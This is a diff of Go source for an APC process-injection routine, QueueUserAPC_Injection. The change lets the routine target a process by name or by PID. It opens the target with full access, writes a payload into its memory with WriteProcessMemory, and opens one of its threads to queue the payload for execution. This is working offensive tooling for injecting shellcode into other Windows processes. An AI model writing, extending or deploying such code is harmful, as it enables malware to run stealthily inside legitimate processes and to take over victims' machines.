@@ -39,14 +39,30 @@ func GetThreads(pid uintptr) []uint32 {
 }
 
 
-func QueueUserAPC_Injection(process_name string, payload []byte) {
-   var proc_handles_slice []uintptr = GetProcessByName(process_name);
-   var first_proc = proc_handles_slice[0];
-   var pid uintptr = GetProcessId(first_proc);
-   fmt.Println("[+] Process PID: \t\t", pid);
+func QueueUserAPC_Injection(process_name string, pid int, payload []byte) {
+   // Get PID
+   if ((process_name == "") && (pid == 0)){
+      fmt.Println("[-] Process name or PID is necessary. ");
+      os.Exit(-1);
+   }
+   var pid_uintptr uintptr;
+   if (process_name != "") {
+      fmt.Println("[+] Process name: \t\t", process_name);   
+      var proc_handles_slice []uintptr = GetProcessByName(process_name);
+      if (len(proc_handles_slice) < 1){
+         fmt.Println("[-] No PID returned for process name:", process_name, "\n[-] Try adding \".exe\" at the end of the process name.");
+         os.Exit(-1);
+      } else {
+         var first_proc = proc_handles_slice[0];
+         pid_uintptr = GetProcessId(first_proc);   
+      }
+   } else{
+         pid_uintptr = uintptr(pid)
+   }
+   fmt.Println("[+] Process PID: \t\t", pid_uintptr);
 
    // OpenProcess
-   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
+   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid_uintptr);
    if (proc_handle == 0){
       fmt.Println("[-] OpenProcess API call failed. ");
       os.Exit(-1);
@@ -70,7 +86,7 @@ func QueueUserAPC_Injection(process_name string, payload []byte) {
    fmt.Println("[+] WriteProcessMemory response:", res);
 
    // OpenThread
-   var thread_ids_slice []uint32 = GetThreads(pid);
+   var thread_ids_slice []uint32 = GetThreads(pid_uintptr);
    var first_thread uint32 = thread_ids_slice[0];
    fmt.Println("[+] First thread:\t\t", first_thread);
    var thread_handle uintptr = OpenThread(0x0010, 0, first_thread);
